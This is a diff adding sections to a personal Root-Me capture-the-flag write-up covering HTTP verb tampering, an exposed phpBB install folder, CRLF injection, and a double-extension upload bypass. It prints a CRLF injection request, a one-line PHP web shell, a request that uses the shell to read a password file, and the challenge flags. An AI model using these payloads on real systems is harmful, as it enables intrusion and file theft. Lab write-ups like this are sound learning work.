@@ -67,5 +67,37 @@ to the request (script in the folder)
 
 pass: ExecutionAfterRedirectIsBad
 
+# 11. HTTP - Verb tampering
+My first idea is tried the script and the payload i had done earlier chall but no working, so i have to rethink about this chall. i note that the title is **Verb tampering** so the ideal here is change the request method to anything other than GET.
 
+pass: ```a23e$dme96d3saez$$prap```
 
+# 12. Install files
+According to the title, the admin of this page uses phpbb (i dont know what it is) and he forget to delete his install folder, so the idea this to find it
+
+Location: **/phpbb/install/**
+
+pass: karambar
+
+# 13. CRLF
+(Carriage return and Line Feed) it means to create new lines (\r\n).
+So the idea is to use intercept proxy (e.g. Burp suite) edit request to
+```
+GET /web-serveur/ch14/?username=%0D%0Aadmin%20authenticated%0D%0INJECTINHERE
+```
+# 14. File upload - Double extensions
+The idea is upload our script and rce. 
+(i have tried reverse shell with netcat and ngrok to port fowarding but somehow it didnt work LOL so i use this script from another write up)
+```
+<?php
+
+$data = system($_GET["cmd"]);
+echo $data;
+
+?>
+```
+now change this to reverse.php.png to bypass the image filter and the final step is rce with cmd param
+```
+challenge01.root-me.org/web-serveur/ch20/galerie/upload/0c3f5ea659f03569d6fce99cf1233c56/test.php.png?cmd=cat%20../../../.passwd
+```
+pass: Gg9LRz-hWSxqqUKd77-_q-6G8
